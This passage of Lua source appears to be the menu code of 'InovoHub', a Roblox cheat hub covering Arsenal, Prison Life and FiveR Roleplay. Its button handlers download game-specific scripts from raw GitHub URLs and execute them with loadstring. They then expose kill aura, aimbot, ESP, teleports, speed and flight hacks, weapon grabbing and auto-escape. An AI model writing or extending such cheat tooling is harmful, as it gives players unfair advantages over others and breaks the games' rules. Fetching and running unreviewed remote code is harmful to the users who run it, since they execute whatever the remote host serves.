    MovementTab:AddToggle({
        Text = "Custom Jump",
        Default = false,
        Callback = function(value)
            Arsenal.Settings.Movement.JumpEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Jump Power",
        Min = 50,
        Max = 200,
        Default = 50,
        Increment = 5,
        Callback = function(value)
            Arsenal.Settings.Movement.JumpPower = value
        end
    })
    
    -- Misc Tab
    MiscTab:AddLabel("Information")
    MiscTab:AddDivider()
    MiscTab:AddLabel("Credits: InovoProductions")
    MiscTab:AddLabel("Version: 1.1.0")
    MiscTab:AddLabel("Game: Arsenal")
end)

-- Prison Life Click
prisonBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    task.wait(0.1)
    
    -- Load Prison Life
    local prisonSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/PrisonLife.lua")
    if not prisonSource then
        warn("[InovoHub] Failed to load Prison Life script.")
        return
    end
    local prisonChunk = loadstring(prisonSource)
    if not prisonChunk then
        warn("[InovoHub] Could not compile Prison Life script.")
        return
    end
    local PrisonLife = prisonChunk()
    if type(PrisonLife) ~= "table" or not PrisonLife.Init then
        warn("[InovoHub] Prison Life script returned unexpected result.")
        return
    end
    PrisonLife:Init()
    
    local Window = InovoLib:CreateWindow({
        Title = "InovoProductions | Prison Life",
        Size = UDim2.new(0, 650, 0, 550)
    })
    
    local CombatTab = Window:CreateTab("Combat")
    local VisualsTab = Window:CreateTab("Visuals")
    local TeleportsTab = Window:CreateTab("Teleports")
    local MovementTab = Window:CreateTab("Movement")
    local MiscTab = Window:CreateTab("Misc")
    
    -- Combat Tab
    CombatTab:AddLabel("Kill Aura")
    CombatTab:AddDivider()
    
    CombatTab:AddToggle({
        Text = "Enable Kill Aura",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.Combat.KillAura = value
        end
    })
    
    CombatTab:AddSlider({
        Text = "Kill Aura Range",
        Min = 5,
        Max = 30,
        Default = 15,
        Increment = 1,
        Callback = function(value)
            PrisonLife.Settings.Combat.KillAuraRange = value
        end
    })
    
    CombatTab:AddDivider()
    CombatTab:AddLabel("Aimbot")
    CombatTab:AddDivider()
    
    CombatTab:AddToggle({
        Text = "Enable Aimbot",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.Combat.Aimbot = value
        end
    })
    
    CombatTab:AddToggle({
        Text = "Team Check",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.Combat.TeamCheckCombat = value
        end
    })
    
    CombatTab:AddToggle({
        Text = "Show FOV Circle",
        Default = true,
        Callback = function(value)
            PrisonLife.Settings.Combat.ShowFOV = value
        end
    })
    
    CombatTab:AddSlider({
        Text = "FOV Size",
        Min = 10,
        Max = 500,
        Default = 100,
        Increment = 5,
        Callback = function(value)
            PrisonLife.Settings.Combat.AimbotFOV = value
        end
    })
    
    CombatTab:AddSlider({
        Text = "Smoothness",
        Min = 1,
        Max = 20,
        Default = 5,
        Increment = 1,
        Callback = function(value)
            PrisonLife.Settings.Combat.AimbotSmooth = value
        end
    })

    CombatTab:AddDropdown({
        Text = "Aim Part",
        Items = {"Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"},
        Default = "Head",
        Callback = function(value)
            PrisonLife.Settings.Combat.AimPart = value
        end
    })
    
    -- Visuals Tab
    VisualsTab:AddLabel("ESP Settings")
    VisualsTab:AddDivider()
    
    VisualsTab:AddToggle({
        Text = "Enable ESP",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.ESP.Enabled = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Box",
        Default = true,
        Callback = function(value)
            PrisonLife.Settings.ESP.ShowBox = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Name",
        Default = true,
        Callback = function(value)
            PrisonLife.Settings.ESP.ShowName = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Distance",
        Default = true,
        Callback = function(value)
            PrisonLife.Settings.ESP.ShowDistance = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Team Check",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.ESP.TeamCheck = value
        end
    })
    
    -- Teleports Tab
    TeleportsTab:AddLabel("Location Teleports")
    TeleportsTab:AddDivider()
    
    for locationName, locationCFrame in pairs(PrisonLife.Locations) do
        TeleportsTab:AddButton({
            Text = locationName,
            Callback = function()
                PrisonLife:Teleport(locationCFrame)
            end
        })
    end
    
    TeleportsTab:AddDivider()
    TeleportsTab:AddButton({
        Text = "Save Position",
        Callback = function()
            PrisonLife:SavePosition()
        end
    })
    
    TeleportsTab:AddButton({
        Text = "Load Position",
        Callback = function()
            PrisonLife:LoadPosition()
        end
    })
    
    -- Movement Tab
    MovementTab:AddLabel("Movement Settings")
    MovementTab:AddDivider()
    
    MovementTab:AddToggle({
        Text = "Custom Speed",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.Movement.SpeedEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Walk Speed",
        Min = 16,
        Max = 200,
        Default = 16,
        Increment = 2,
        Callback = function(value)
            PrisonLife.Settings.Movement.Speed = value
        end
    })
    
    MovementTab:AddToggle({
        Text = "Custom Jump",
        Default = false,
        Callback = function(value)
            PrisonLife.Settings.Movement.JumpEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Jump Power",
        Min = 50,
        Max = 200,
        Default = 50,
        Increment = 5,
        Callback = function(value)
            PrisonLife.Settings.Movement.JumpPower = value
        end
    })
    
    -- Misc Tab
    MiscTab:AddLabel("Useful Functions")
    MiscTab:AddDivider()
    
    MiscTab:AddButton({
        Text = "Get All Guns",
        Callback = function()
            PrisonLife:GetAllGuns()
        end
    })
    
    MiscTab:AddButton({
        Text = "Auto Escape",
        Callback = function()
            PrisonLife:AutoEscape()
        end
    })
    
    MiscTab:AddDivider()
    MiscTab:AddLabel("Credits: InovoProductions")
    MiscTab:AddLabel("Version: 1.1.0")
    MiscTab:AddLabel("Game: Prison Life")
end)

-- FiveR Click
fiverBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    task.wait(0.1)
    
    local fiverSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/FiveR.lua")
    if not fiverSource then
        warn("[InovoHub] Failed to load FiveR script.")
        return
    end
    local fiverChunk = loadstring(fiverSource)
    if not fiverChunk then
        warn("[InovoHub] Could not compile FiveR script.")
        return
    end
    local FiveR = fiverChunk()
    if type(FiveR) ~= "table" or not FiveR.Init then
        warn("[InovoHub] FiveR script returned unexpected result.")
        return
    end
    FiveR:Init()
    
    local Window = InovoLib:CreateWindow({
        Title = "InovoProductions | FiveR Roleplay",
        Size = UDim2.new(0, 650, 0, 550)
    })
    
    local UtilityTab = Window:CreateTab("Utility")
    local ESPTab = Window:CreateTab("ESP")
    local MovementTab = Window:CreateTab("Movement")
    local TeleportsTab = Window:CreateTab("Teleports")
    local MiscTab = Window:CreateTab("Misc")
    
    -- Utility Tab
    UtilityTab:AddLabel("Automation")
    UtilityTab:AddDivider()
    
    UtilityTab:AddToggle({
        Text = "Auto Interact Prompts",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Utility.AutoInteractPrompts = value
        end
    })
    
    UtilityTab:AddToggle({
        Text = "Auto Collect Drops",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Utility.AutoCollectDrops = value
        end
    })
    
    UtilityTab:AddToggle({
        Text = "Dispatch Notifications",
        Default = true,
        Callback = function(value)
            FiveR.Settings.Utility.DispatchAlerts = value
        end
    })
    
    -- ESP Tab
    ESPTab:AddLabel("ESP Options")
    ESPTab:AddDivider()
    
    ESPTab:AddToggle({
        Text = "Enable ESP",
        Default = false,
        Callback = function(value)
            FiveR.Settings.ESP.Enabled = value
        end
    })
    
    ESPTab:AddToggle({
        Text = "Player ESP",
        Default = true,
        Callback = function(value)
            FiveR.Settings.ESP.Players = value
        end
    })
    
    ESPTab:AddToggle({
        Text = "Vehicle ESP",
        Default = true,
        Callback = function(value)
            FiveR.Settings.ESP.Vehicles = value
        end
    })
    
    ESPTab:AddToggle({
        Text = "Show Names",
        Default = true,
        Callback = function(value)
            FiveR.Settings.ESP.ShowNames = value
        end
    })
    
    ESPTab:AddToggle({
        Text = "Show Distance",
        Default = true,
        Callback = function(value)
            FiveR.Settings.ESP.ShowDistance = value
        end
    })
    
    ESPTab:AddSlider({
        Text = "Max Distance",
        Min = 100,
        Max = 2500,
        Default = 1200,
        Increment = 50,
        Callback = function(value)
            FiveR.Settings.ESP.MaxDistance = value
        end
    })
    
    -- Movement Tab
    MovementTab:AddLabel("Movement Controls")
    MovementTab:AddDivider()
    
    MovementTab:AddToggle({
        Text = "Custom Walk Speed",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Movement.SpeedEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Walk Speed",
        Min = 8,
        Max = 80,
        Default = 16,
        Increment = 1,
        Callback = function(value)
            FiveR.Settings.Movement.WalkSpeed = value
        end
    })
    
    MovementTab:AddToggle({
        Text = "Sprint Boost",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Movement.SprintEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Sprint Speed",
        Min = 16,
        Max = 120,
        Default = 28,
        Increment = 1,
        Callback = function(value)
            FiveR.Settings.Movement.SprintSpeed = value
        end
    })
    
    MovementTab:AddToggle({
        Text = "Custom Jump",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Movement.JumpEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Jump Power",
        Min = 50,
        Max = 200,
        Default = 50,
        Increment = 5,
        Callback = function(value)
            FiveR.Settings.Movement.JumpPower = value
        end
    })
    
    MovementTab:AddToggle({
        Text = "Enable Flight",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Movement.FlyEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Fly Speed",
        Min = 20,
        Max = 200,
        Default = 65,
        Increment = 5,
        Callback = function(value)
            FiveR.Settings.Movement.FlySpeed = value
        end
    })
    
    -- Teleports Tab
    TeleportsTab:AddLabel("Preset Locations")
    TeleportsTab:AddDivider()
    
    local locationNames = {}
    for name in pairs(FiveR.LocationPresets) do
        table.insert(locationNames, name)
    end
    table.sort(locationNames)
    
    for _, locationName in ipairs(locationNames) do
        TeleportsTab:AddButton({
            Text = locationName,
            Callback = function()
                FiveR:TeleportPreset(locationName)
            end
        })
    end
    
    TeleportsTab:AddDivider()
    TeleportsTab:AddButton({
        Text = "Save Position",
        Callback = function()
            FiveR:SavePosition()
        end
    })
    
    TeleportsTab:AddButton({
        Text = "Load Position",
        Callback = function()
            FiveR:LoadPosition()
        end
    })
    
    -- Misc Tab
    MiscTab:AddLabel("Environment")
    MiscTab:AddDivider()
    
    MiscTab:AddToggle({
        Text = "Night Vision",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Misc.NightVision = value
        end
    })
    
    MiscTab:AddToggle({
        Text = "Clear Weather",
        Default = false,
        Callback = function(value)
            FiveR.Settings.Misc.ClearWeather = value
        end
    })
    
    MiscTab:AddButton({
        Text = "Reset Visuals",
        Callback = function()
            FiveR:ResetVisuals()
        end
    })
    
    MiscTab:AddDivider()
    MiscTab:AddToggle({
        Text = "Anti AFK",
        Default = true,
        Callback = function(value)
            FiveR.Settings.Misc.AntiAFK = value
        end
    })
    
    MiscTab:AddDivider()
    MiscTab:AddLabel("Credits: InovoProductions")
    MiscTab:AddLabel("Game: FiveR Roleplay")
end)

end -- End of loadMainGUI function

print("[InovoHub] Key system loaded!")



